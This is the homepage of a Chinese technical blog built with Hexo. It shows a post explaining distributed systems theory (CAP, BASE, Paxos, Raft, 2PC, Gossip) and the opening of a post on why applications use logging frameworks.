<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="冉的技术宝典">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="冉的技术宝典">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="冉丝堂">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>冉的技术宝典</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  

  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
  <script src="/js/third-party/tags/mermaid.js" defer></script>





  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">冉的技术宝典</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">冉丝堂</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">24</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/24/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%8E%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E4%B8%80%E3%80%81%E5%88%86%E5%B8%83%E5%BC%8F%E7%90%86%E8%AE%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冉丝堂">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="冉的技术宝典">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | 冉的技术宝典">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/24/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%8E%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E4%B8%80%E3%80%81%E5%88%86%E5%B8%83%E5%BC%8F%E7%90%86%E8%AE%BA/" class="post-title-link" itemprop="url">一、分布式理论</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-10-24 17:06:58 / 修改时间：22:17:05" itemprop="dateCreated datePublished" datetime="2025-10-24T17:06:58+08:00">2025-10-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%8E%E5%BE%AE%E6%9C%8D%E5%8A%A1/" itemprop="url" rel="index"><span itemprop="name">分布式与微服务</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="一、分布式理论"><a href="#一、分布式理论" class="headerlink" title="一、分布式理论"></a>一、分布式理论</h1><p>在单个计算机上，所有操作都是可控的、有序的。但在分布式系统中，多台机器通过网络协作，网络是不可靠的（会延迟、丢包），机器是不可靠的（会宕机），这就引入了巨大的复杂性。分布式理论正是为了解决在不可靠的硬件和网络上构建可靠系统的问题。</p>
<h2 id="1-CAP-BASE-理论"><a href="#1-CAP-BASE-理论" class="headerlink" title="1. CAP &amp; BASE 理论"></a>1. <code>CAP</code> &amp; <code>BASE</code> 理论</h2><h3 id="1-1-CAP-理论"><a href="#1-1-CAP-理论" class="headerlink" title="1.1 CAP 理论"></a>1.1 <code>CAP</code> 理论</h3><p><code>CAP</code> 理论，也称为布鲁尔定理（Brewer’s theorem），是分布式系统设计的基石。它指出，一个分布式系统<strong>不可能</strong>同时满足以下三个基本需求，最多只能满足其中两个。</p>
<ol>
<li><strong>C - 一致性 (Consistency)</strong><ul>
<li><strong>定义</strong>：强一致性（或线性一致性）。任何读操作都能读取到在此之前已完成的写操作的最新结果。对系统中的所有节点来说，在任意时刻，它们看到的数据都是完全一样的。</li>
<li><strong>通俗理解</strong>：你往一个账户存钱，存完后，你立即在任何一台ATM机上查询，都应该看到最新的余额。</li>
</ul>
</li>
<li><strong>A - 可用性 (Availability)</strong><ul>
<li><strong>定义</strong>：每一个（非失败节点的）请求都能在有限时间内收到一个（非错误的）响应。系统必须一直处于可用的状态。</li>
<li><strong>通俗理解</strong>：你访问网站，网站总能给你一个响应，不管是显示正确页面还是一个稍旧的页面，而不是直接超时或报错。</li>
</ul>
</li>
<li><strong>P - 分区容错性 (Partition Tolerance)</strong><ul>
<li><strong>定义</strong>：系统在遇到任何网络分区（即节点间的网络连接中断或延迟）时，仍然能够继续运行。</li>
<li><strong>通俗理解</strong>：机房里的两排服务器之间的网线被拔掉了，这两排服务器无法通信，但整个系统对外不能完全挂掉。在现代分布式系统中，网络分区被认为是<strong>必然会发生</strong>的，因此 <strong><code>P</code> 是一个必须满足的选项</strong>。</li>
</ul>
</li>
</ol>
<p><strong>CAP 的权衡（Trade-off）：</strong></p>
<p>由于 <code>P</code> 是必须项，因此分布式系统的设计者必须在 <code>C</code> 和 <code>A</code> 之间做出选择。</p>
<ul>
<li><strong>选择 <code>CP</code> (放弃 <code>A</code>)</strong>：<ul>
<li><strong>策略</strong>：当网络分区发生时，为了保证数据的一致性，系统会拒绝一部分请求。</li>
<li><strong>例子</strong>：一个节点（或分区）为了确保它持有的数据不是“旧”数据，它可能会拒绝写入请求，甚至拒绝读取请求，直到它能与集群中的大多数节点重新建立联系，确认数据状态。</li>
<li><strong>适用场景</strong>：对数据一致性要求极高的系统，如银行交易、分布式锁服务。例如：<code>Zookeeper</code>, <code>etcd</code>, <code>HBase</code>。</li>
</ul>
</li>
<li><strong>选择 <code>AP</code> (放弃 <code>C</code>)</strong>：<ul>
<li><strong>策略</strong>：当网络分区发生时，为了保证系统的可用性，每个节点（或分区）仍然可以独立地处理请求。但这可能导致不同节点上的数据暂时不一致。</li>
<li><strong>例子</strong>：一个分区内的节点继续接受写入，当网络恢复后，系统需要一套机制（如冲突解决）来合并这些在分区期间产生的数据，最终达到一致状态。</li>
<li><strong>适用场景</strong>：对可用性要求极高，能容忍最终一致性的系统。例如：<code>Cassandra</code>, <code>Amazon DynamoDB</code>, 大部分NoSQL数据库。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-2-BASE-理论"><a href="#1-2-BASE-理论" class="headerlink" title="1.2 BASE 理论"></a>1.2 <code>BASE</code> 理论</h3><p><code>BASE</code> 理论是 <code>CAP</code> 理论中 <code>AP</code> 方案的一个延伸和实践。它不是像 <code>ACID</code> 那样追求强一致性，而是通过牺牲强一致性来获得高可用性，并提出了一套处理这种“不一致”状态的指导思想。</p>
<ol>
<li><strong>BA - 基本可用 (Basically Available)</strong><ul>
<li><strong>定义</strong>：系统在出现不可预知故障的时候，允许损失部分可用性。例如，响应时间增加，或部分功能降级。</li>
<li><strong>例子</strong>：在双十一大促时，为了保证核心的下单功能，淘宝可能会暂时关闭“评价”、“退款”等非核心功能。</li>
</ul>
</li>
<li><strong>S - 软状态 (Soft State)</strong><ul>
<li><strong>定义</strong>：允许系统中的数据存在中间状态，并且该中间状态不会影响系统整体可用性。这个状态是“软”的，因为它会随着时间的推移，通过数据同步等方式，自己发生变化。</li>
<li><strong>例子</strong>：订单状态从“已支付”到“已发货”，中间可能有一个“待处理”的短暂状态。不同节点看到这个订单的状态可能是不同步的。</li>
</ul>
</li>
<li><strong>E - 最终一致性 (Eventually Consistent)</strong><ul>
<li><strong>定义</strong>：系统中所有的数据副本，在经过一段时间的同步后，最终能够达到一个一致的状态。不需要实时保证系统数据的强一致性。</li>
<li><strong>例子</strong>：你在社交媒体上发了一条动态，你的好友可能不会在同一瞬间全部看到。有的人1秒后看到，有的人5秒后看到，但最终所有人都会看到。</li>
</ul>
</li>
</ol>
<p><strong><code>BASE</code> 理论是现代大规模互联网应用设计的核心思想之一</strong>，因为它完美地契合了高并发、高可用的需求。</p>
<hr>
<h2 id="2-分布式一致性协议：Paxos-Raft-概念"><a href="#2-分布式一致性协议：Paxos-Raft-概念" class="headerlink" title="2. 分布式一致性协议：Paxos, Raft (概念)"></a>2. 分布式一致性协议：<code>Paxos</code>, <code>Raft</code> (概念)</h2><p><code>CAP</code> 告诉我们必须在 <code>C</code> 和 <code>A</code> 之间选择，而 <code>Paxos</code> 和 <code>Raft</code> 就是实现 <code>CP</code>（强一致性）的两种著名算法。它们解决的核心问题是<strong>共识（Consensus）</strong>：如何让一组节点在一个值上达成一致，并且这个决定一旦做出就不可更改。</p>
<h3 id="2-1-Paxos-协议"><a href="#2-1-Paxos-协议" class="headerlink" title="2.1 Paxos 协议"></a>2.1 <code>Paxos</code> 协议</h3><ul>
<li><strong>提出者</strong>：莱斯利·兰伯特（Leslie Lamport），图灵奖得主。</li>
<li><strong>核心思想</strong>：通过一个“两阶段提交”的模式，在一个可能发生消息丢失、节点宕机的分布式系统中，让多个节点对某个提案（Proposal）达成共识。</li>
<li><strong>角色</strong>：<ul>
<li><strong>Proposer (提议者)</strong>：提出一个提案，希望被大家接受。</li>
<li><strong>Acceptor (接受者)</strong>：对提案进行投票，决定是否接受。</li>
<li><strong>Learner (学习者)</strong>：从 Acceptor 那里学习最终被确定的提案结果。</li>
</ul>
</li>
<li><strong>简化流程</strong>：<ol>
<li><strong>准备阶段 (Prepare Phase)</strong>：<ul>
<li>Proposer 选择一个提案编号 <code>N</code>，向所有 Acceptor 发送 <code>Prepare(N)</code> 请求。</li>
<li>Acceptor 收到后，如果 <code>N</code> 大于它之前响应过的任何提案编号，就承诺不再接受编号小于 <code>N</code> 的提案，并把之前已接受的最高编号提案（如果有）返回给 Proposer。</li>
</ul>
</li>
<li><strong>接受阶段 (Accept Phase)</strong>：<ul>
<li>如果 Proposer 收到了<strong>多数派（Quorum，通常是 &gt; N&#x2F;2）</strong> Acceptor 的响应，它就会从这些响应中选择编号最大的提案的值，或者使用自己的值，向这些 Acceptor 发送 <code>Accept(N, Value)</code> 请求。</li>
<li>Acceptor 收到 <code>Accept</code> 请求后，只要没有承诺过更高编号的提案，就接受该提案。</li>
</ul>
</li>
</ol>
</li>
<li><strong>特点</strong>：<ul>
<li><strong>优点</strong>：理论上最为通用和健壮的共识算法。</li>
<li><strong>缺点</strong>：非常难以理解和正确实现。原始的 Paxos 算法只描述了如何对单个值达成共识，实际应用中需要 <code>Multi-Paxos</code> 来对一系列值（日志）达成共识，这更加复杂。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-2-Raft-协议"><a href="#2-2-Raft-协议" class="headerlink" title="2.2 Raft 协议"></a>2.2 <code>Raft</code> 协议</h3><ul>
<li><strong>提出者</strong>：斯坦福大学的 Diego Ongaro 和 John Ousterhout。</li>
<li><strong>核心思想</strong>：为了<strong>可理解性</strong>而设计的共识算法。它通过明确的 Leader 选举和日志复制流程，使得算法逻辑比 Paxos 清晰得多。</li>
<li><strong>角色（节点状态）</strong>：<ul>
<li><strong>Follower (跟随者)</strong>：被动接收 Leader 的日志，并投票给 Candidate。</li>
<li><strong>Candidate (候选人)</strong>：当 Follower 在一段时间内没收到 Leader 的心跳时，会转变为 Candidate，发起选举。</li>
<li><strong>Leader (领导者)</strong>：整个集群在同一时间只有一个 Leader，负责处理所有客户端请求，并向 Follower 复制日志。</li>
</ul>
</li>
<li><strong>核心流程</strong>：<ol>
<li><strong>Leader 选举 (Leader Election)</strong>：<ul>
<li>系统启动时所有节点都是 Follower。</li>
<li>Follower 如果在一个随机的“选举超时”时间内没收到 Leader 的心跳，就变成 Candidate。</li>
<li>Candidate 投自己一票，并向其他节点请求投票。</li>
<li>获得<strong>多数派</strong>选票的 Candidate 成为新的 Leader。</li>
</ul>
</li>
<li><strong>日志复制 (Log Replication)</strong>：<ul>
<li>Leader 接收客户端请求，将其作为一条日志条目（Log Entry）追加到自己的日志中。</li>
<li>Leader 并行地将这条日志条目发送给所有 Follower。</li>
<li>当<strong>多数派</strong>的 Follower 都成功复制了该日志后，Leader 就将该日志条目标记为“已提交 (committed)”，并执行它，然后将结果返回给客户端。</li>
</ul>
</li>
</ol>
</li>
<li><strong>特点</strong>：<ul>
<li><strong>优点</strong>：极大地简化了共识算法的理解和实现难度，有清晰的 Leader 角色，流程明确。</li>
<li><strong>缺点</strong>：在某些极端网络分区下的性能和灵活性可能略逊于 Paxos 的某些变种，但在绝大多数场景下表现优异。</li>
</ul>
</li>
</ul>
<p><strong>Raft 与 Paxos 的关系</strong>：可以认为 Raft 是一种结构更清晰、更容易实现的 Paxos 变体。</p>
<hr>
<h2 id="3-补充知识点"><a href="#3-补充知识点" class="headerlink" title="3. 补充知识点"></a>3. 补充知识点</h2><h3 id="3-1-一致性模型"><a href="#3-1-一致性模型" class="headerlink" title="3.1 一致性模型"></a>3.1 一致性模型</h3><p><code>CAP</code> 中的 <code>C</code> 只是一个笼统的“强一致性”，实际上一致性有不同强度等级。</p>
<ul>
<li><strong>强一致性 (Strong Consistency &#x2F; Linearizability)</strong>：最严格的模型。任何读操作都必须返回最近一次写操作完成后的值。所有操作看起来就像是在一个单核处理器上按时间顺序串行执行一样。<code>Raft</code> 和 <code>Paxos</code> 实现的就是这种。</li>
<li><strong>顺序一致性 (Sequential Consistency)</strong>：比强一致性弱一点。它不要求操作的顺序与真实时间一致，但要求所有节点看到的操作顺序是<strong>相同</strong>的。</li>
<li><strong>因果一致性 (Causal Consistency)</strong>：更弱。只要求有因果关系的操作（如A操作的结果影响了B操作）在所有节点上都保持其先后顺序。没有因果关系的操作可以乱序。</li>
<li><strong>最终一致性 (Eventual Consistency)</strong>：最弱的模型，是 <code>BASE</code> 理论的核心。不保证任何时刻数据都一致，但保证如果没有新的更新，数据最终会达到一致状态。</li>
</ul>
<hr>
<h3 id="3-2-两阶段提交协议-2PC-Two-Phase-Commit"><a href="#3-2-两阶段提交协议-2PC-Two-Phase-Commit" class="headerlink" title="3.2 两阶段提交协议 (2PC - Two-Phase Commit)"></a>3.2 两阶段提交协议 (2PC - Two-Phase Commit)</h3><p>这是另一个实现强一致性的经典协议，常用于分布式数据库事务。</p>
<ul>
<li><strong>角色</strong>：一个<strong>协调者 (Coordinator)</strong> 和多个<strong>参与者 (Participants)</strong>。</li>
<li><strong>阶段一：准备阶段 (Prepare Phase)</strong><ul>
<li>协调者向所有参与者发送“准备提交”请求。</li>
<li>参与者执行事务操作，写入预写日志（Undo&#x2F;Redo Log），然后锁定资源，并向协调者回复“准备好了”或“失败”。</li>
</ul>
</li>
<li><strong>阶段二：提交阶段 (Commit Phase)</strong><ul>
<li>如果协调者收到所有参与者的“准备好了”响应，就向它们发送“提交”命令。参与者完成提交，释放锁。</li>
<li>如果协调者收到任何一个“失败”响应，或有参与者超时，就向所有参与者发送“回滚”命令。</li>
</ul>
</li>
<li><strong>存在的问题</strong>：<ul>
<li><strong>同步阻塞</strong>：所有参与者在等待协调者的最终决定时，资源是锁定的，无法服务其他请求。</li>
<li><strong>单点故障</strong>：如果协调者在第二阶段崩溃，所有参与者都会被阻塞，不知道是该提交还是回滚。</li>
<li><strong>数据不一致</strong>：如果协调者发出提交命令后，只有部分参与者收到了，此时协调者宕机，就会导致一部分节点提交了，另一部分没有，数据不一致。</li>
</ul>
</li>
</ul>
<p><code>2PC</code> 和 <code>Paxos/Raft</code> 都能实现一致性，但 <code>2PC</code> 是一个<strong>阻塞协议</strong>，而 <code>Paxos/Raft</code> 是<strong>非阻塞</strong>的，即使有节点宕机，只要多数派存活，系统就能继续工作。</p>
<hr>
<h3 id="3-3-Gossip-协议"><a href="#3-3-Gossip-协议" class="headerlink" title="3.3 Gossip 协议"></a>3.3 Gossip 协议</h3><p>这是一种实现最终一致性的去中心化协议，非常适合 <code>AP</code> 类型的系统。</p>
<ul>
<li><strong>工作方式</strong>：像病毒或谣言传播一样。<ol>
<li>每个节点定期随机选择几个其他节点。</li>
<li>将自己的信息（或自己知道的“新”信息）发送给这些节点。</li>
<li>接收方收到信息后，如果发现是自己不知道的新信息，就更新自己的状态，并准备在下一轮传播中告诉其他节点。</li>
</ol>
</li>
<li><strong>特点</strong>：<ul>
<li><strong>去中心化</strong>：没有 Leader，所有节点对等。</li>
<li><strong>高容错</strong>：单个或多个节点宕机对协议影响很小。</li>
<li><strong>最终一致性</strong>：信息最终会传遍整个集群，但有延迟。</li>
</ul>
</li>
<li><strong>应用</strong>：<code>Cassandra</code> 和 <code>Redis Cluster</code> 用它来发现集群中的其他节点和同步节点状态。</li>
</ul>
<hr>
<h3 id="3-4-实际应用对照表"><a href="#3-4-实际应用对照表" class="headerlink" title="3.4 实际应用对照表"></a>3.4 实际应用对照表</h3><table>
<thead>
<tr>
<th align="left">理论&#x2F;协议</th>
<th align="left">主要特点</th>
<th align="left">典型应用</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>CP</strong></td>
<td align="left">强一致性，牺牲可用性</td>
<td align="left"><code>ZooKeeper</code> (使用ZAB，类似Paxos), <code>etcd</code> (使用Raft), <code>Consul</code> (使用Raft)</td>
</tr>
<tr>
<td align="left"><strong>AP</strong></td>
<td align="left">高可用性，最终一致性</td>
<td align="left"><code>Cassandra</code> (使用Gossip), <code>Amazon DynamoDB</code>, <code>CouchDB</code></td>
</tr>
<tr>
<td align="left"><strong>Paxos&#x2F;Raft</strong></td>
<td align="left">共识算法，实现强一致性</td>
<td align="left">用于构建CP系统，如 <code>TiDB</code> (Raft), <code>CockroachDB</code> (Raft)</td>
</tr>
<tr>
<td align="left"><strong>2PC</strong></td>
<td align="left">分布式事务，原子提交</td>
<td align="left">传统分布式关系型数据库（如 Oracle RAC），但现代系统倾向于避免</td>
</tr>
<tr>
<td align="left"><strong>Gossip</strong></td>
<td align="left">去中心化，最终一致性</td>
<td align="left"><code>Cassandra</code> (节点发现), <code>Redis Cluster</code> (节点状态同步)</td>
</tr>
</tbody></table>
<hr>
<h2 id="二、服务器架构"><a href="#二、服务器架构" class="headerlink" title="二、服务器架构"></a>二、服务器架构</h2><h3 id="1-服务治理"><a href="#1-服务治理" class="headerlink" title="1. 服务治理"></a>1. 服务治理</h3><ul>
<li>服务注册与发现：<code>Nacos</code>, <code>Eureka</code></li>
<li>配置中心：<code>Nacos</code>, <code>Apollo</code></li>
</ul>
<h3 id="2-服务通信与熔断"><a href="#2-服务通信与熔断" class="headerlink" title="2. 服务通信与熔断"></a>2. 服务通信与熔断</h3><ul>
<li>服务调用：<code>OpenFeign</code></li>
<li>负载均衡：<code>Ribbon</code> &#x2F; <code>Spring Cloud LoadBalancer</code></li>
<li>服务容错：<code>Hystrix</code> &#x2F; <code>Sentinel</code> (流量控制、熔断降级)</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/21/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%BA%93/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%BA%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冉丝堂">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="冉的技术宝典">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | 冉的技术宝典">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/21/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%BA%93/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%BA%93/" class="post-title-link" itemprop="url">常用工具库</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-10-21 20:51:59" itemprop="dateCreated datePublished" datetime="2025-10-21T20:51:59+08:00">2025-10-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-24 11:48:26" itemprop="dateModified" datetime="2025-10-24T11:48:26+08:00">2025-10-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E4%B8%8E%E7%94%9F%E6%80%81/" itemprop="url" rel="index"><span itemprop="name">开发框架与生态</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="一、日志框架"><a href="#一、日志框架" class="headerlink" title="一、日志框架"></a>一、日志框架</h1><h2 id="1-核心概念与背景"><a href="#1-核心概念与背景" class="headerlink" title="1. 核心概念与背景"></a>1. 核心概念与背景</h2><h3 id="1-1-为什么需要日志框架？"><a href="#1-1-为什么需要日志框架？" class="headerlink" title="1.1 为什么需要日志框架？"></a>1.1 为什么需要日志框架？</h3><p>日志记录了程序运行时的关键信息，是连接开发者与生产环境应用的桥梁。简单地使用 <code>System.out.println</code> 无法满足现代企业级应用的需求，而专业的日志框架则提供了系统化、高性能的解决方案。</p>
<h4 id="1-1-1-调试与问题排查"><a href="#1-1-1-调试与问题排查" class="headerlink" title="1.1.1 调试与问题排查"></a>1.1.1 调试与问题排查</h4><p>这是日志最核心、最直接的价值。当应用程序在测试或生产环境出现问题时，我们无法像在本地开发那样附加调试器（Debugger）进行单步跟踪。此时，日志是<strong>唯一的事后追溯线索</strong>。</p>
<ul>
<li><strong>还原现场</strong>：通过日志可以清晰地看到代码的执行路径、关键变量的值、方法的输入与输出。例如，一个支付失败的请求，日志可以告诉你：请求参数是什么？调用第三方支付接口时发送了什么数据？接口返回了什么错误码？是数据库连接超时还是业务逻辑的判断错误？</li>
<li><strong>定位根源</strong>：详细的异常堆栈信息（Exception Stack Trace）能够精确地指向发生错误的代码行。一个好的日志实践会记录完整的异常信息，而不仅仅是 <code>e.getMessage()</code>。</li>
<li><strong>非必现问题</strong>：对于那些难以复现的、偶发性的问题（如多线程并发导致的脏数据），日志是捕捉瞬间错误场景的唯一手段。</li>
</ul>
<hr>
<h4 id="1-1-2-行为审计与分析"><a href="#1-1-2-行为审计与分析" class="headerlink" title="1.1.2 行为审计与分析"></a>1.1.2 行为审计与分析</h4><p>日志不仅服务于技术，也服务于业务和安全。</p>
<ul>
<li><strong>安全审计</strong>：记录用户的关键操作，如登录、登出、密码修改、权限变更、访问敏感数据等。当出现安全事件时，这些“审计日志”可以作为追责和分析攻击路径的依据。例如：“用户A在时间T从IP地址X尝试登录失败3次”。</li>
<li><strong>业务分析</strong>：记录业务流程中的关键节点，可以用来分析用户行为和业务健康度。例如：<ul>
<li>电商系统可以记录“用户加入购物车”、“创建订单”、“完成支付”等事件，用于计算转化率。</li>
<li>通过分析功能模块的日志记录频率，可以了解哪些功能最受欢迎，为产品迭代提供数据支持。</li>
</ul>
</li>
<li><strong>合规要求</strong>：在金融、医疗等行业，法律法规可能强制要求记录特定的操作日志，并要求保存一定年限以备审查。</li>
</ul>
<hr>
<h4 id="1-1-3-状态监控与告警"><a href="#1-1-3-状态监控与告警" class="headerlink" title="1.1.3 状态监控与告警"></a>1.1.3 状态监控与告警</h4><p>日志是可观测性（Observability）体系的重要组成部分。通过对日志进行实时分析，可以监控应用的健康状况并进行主动告警。</p>
<ul>
<li><strong>健康检查</strong>：记录应用启动、关闭、数据库连接池状态、缓存命中率等系统级指标。监控系统可以通过采集这些日志来判断应用是否正常运行。</li>
<li><strong>性能监控</strong>：记录外部接口调用耗时、关键业务逻辑执行时间等。当耗时超过阈值时，可以发出告警，帮助我们提前发现性能瓶颈。</li>
<li><strong>异常告警</strong>：通过集中式日志系统（如 ELK、Splunk、Loki）收集所有日志，并配置告警规则。例如，当单位时间内 <code>ERROR</code> 级别的日志数量激增，或出现特定关键词（如 <code>OutOfMemoryError</code>, <code>NullPointerException</code>）时，自动通过邮件、短信或企业微信通知开发人员，实现“秒级”响应。</li>
</ul>
<hr>
